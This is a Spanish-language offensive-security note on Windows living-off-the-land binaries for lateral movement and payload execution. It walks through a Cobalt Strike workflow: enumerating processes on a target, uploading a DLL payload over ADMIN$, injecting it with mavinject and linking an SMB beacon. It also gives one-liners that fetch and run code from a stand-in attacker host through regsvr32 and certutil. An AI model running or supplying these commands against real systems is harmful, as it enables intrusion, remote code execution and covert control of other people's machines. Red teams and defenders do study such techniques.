---
tags: [lateral-movement, lolbas, dll-injection, lolbin]
status: done
platform: windows
---

# LOLBAS — Living Off The Land

> Binarios nativos de Windows o firmados por Microsoft que pueden usarse para inyección o ejecución de payloads.

---

## MavInject

Binario de App-V que permite inyección de DLL en procesos en ejecución:

```
mavinject.exe <PID> /INJECTRUNNING <DLL_PATH>
```

### Proceso completo desde Cobalt Strike

```
# 1. Listar procesos del target para elegir víctima
beacon> remote-exec winrm lon-ws-1 Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id

# 2. Subir payload DLL al target
beacon> cd \\lon-ws-1\ADMIN$\System32
beacon> upload C:\Payloads\smb_x64.dll

# 3. Inyectar con MavInject
beacon> remote-exec wmi lon-ws-1 mavinject.exe 1992 /INJECTRUNNING C:\Windows\System32\smb_x64.dll

# 4. Linkear el beacon SMB generado
beacon> link lon-ws-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

**El nombre del named pipe** (`TSVCPIPE-...`) debe coincidir con el configurado en el perfil Malleable C2 o al generar el payload SMB.

> ⚠️ **Alta detección:** MavInject es conocido como LOLBin de inyección. La mayoría de EDRs modernos lo monitorean activamente. **No recomendable en entornos con EDR.**

---

## rundll32 / regsvr32

```
# Cargar DLL maliciosa
rundll32.exe evil.dll,EntryPoint

# regsvr32 (bypass de AppLocker en versiones antiguas)
regsvr32.exe /s /n /u /i:http://attacker/payload.sct scrobj.dll
```

---

## certutil

```
# Descargar archivo
certutil.exe -urlcache -split -f http://attacker/payload.exe payload.exe

# Decodificar base64
certutil.exe -decode payload.b64 payload.exe
```

> ⚠️ `certutil -urlcache` genera logs en `%APPDATA%\Microsoft\CryptnetUrlCache` y es muy conocido.

---

## Referencias

- [LOLBAS Project](https://lolbas-project.github.io/) — catálogo completo
- [[Custom Techniques]] — SCShell como alternativa a MavInject

